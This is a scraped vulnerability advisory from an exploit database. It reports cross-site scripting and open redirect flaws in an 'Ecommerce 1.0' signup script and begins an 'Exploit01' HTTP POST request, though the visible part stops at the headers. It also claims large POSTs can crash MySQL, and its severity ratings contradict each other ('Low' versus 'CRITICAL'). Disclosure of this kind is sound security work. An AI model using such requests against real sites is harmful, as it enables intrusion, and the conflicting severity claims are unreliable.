---
title: Ecommerce 1.0 Cross Site Scripting / Open Redirect
url: https://cxsecurity.com/issue/WLB-2022110045
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-27
fetch_date: 2025-10-03T23:52:33.921148
---
...
|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ecommerce 1.0 Cross Site Scripting / Open Redirect** **2022.11.26**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")  [CWE-601](https://cxsecurity.com/cwe/CWE-601 "Click to see CWE-601")** | |
...
```
## Description01:
JavaScript can be injected into the application response (a vulnerable
app - signup\_script.php, no sanitizing submit function).
The attacker can crash the MySQL server by sending large bites of POST
requests to the MySQL server of this system.
## STATUS: HIGH Vulnerability - CRITICAL
## Real attack:
[+] Exploit01:
```POST
POST /ecommerce/signup\_script.php HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US;q=0.9,en;q=0.8
...
[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110045)
